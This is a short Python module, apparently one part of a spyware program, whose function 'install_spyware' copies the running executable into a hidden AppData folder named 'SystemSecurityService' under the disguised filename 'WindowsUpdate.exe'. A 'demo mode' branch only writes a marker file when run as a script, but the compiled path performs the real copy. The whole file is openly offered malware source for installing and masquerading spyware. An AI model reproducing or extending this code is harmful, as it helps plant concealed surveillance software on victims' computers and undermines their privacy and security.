"""
Function 2: Install Spyware
Copies spyware executable to hidden system location
"""
import os
import shutil
import sys

def install_spyware():
    """
    Install spyware to system directory
    Returns: Path where spyware was installed
    """
    try:
        # Target installation path in AppData
        appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
        install_dir = os.path.join(appdata, 'SystemSecurityService')
        
        # Create directory if it doesn't exist
        os.makedirs(install_dir, exist_ok=True)
        
        # Copy current executable
        current_file = os.path.abspath(sys.argv[0])
        target_file = os.path.join(install_dir, 'WindowsUpdate.exe')
        
        # If running as .py file, just note the installation
        if current_file.endswith('.py'):
            # In demo mode - just create marker file
            marker = os.path.join(install_dir, 'installed.txt')
            with open(marker, 'w') as f:
                f.write(f"Spyware installed from: {current_file}\n")
            print(f"[Function 2] Spyware 'installed' to: {install_dir}")
            return install_dir
        else:
            # Copy actual executable
            shutil.copy2(current_file, target_file)
            print(f"[Function 2] Spyware installed to: {target_file}")
            return target_file
            
    except Exception as e:
        print(f"[Function 2] Installation failed: {e}")
        return None

if __name__ == "__main__":
    install_spyware()
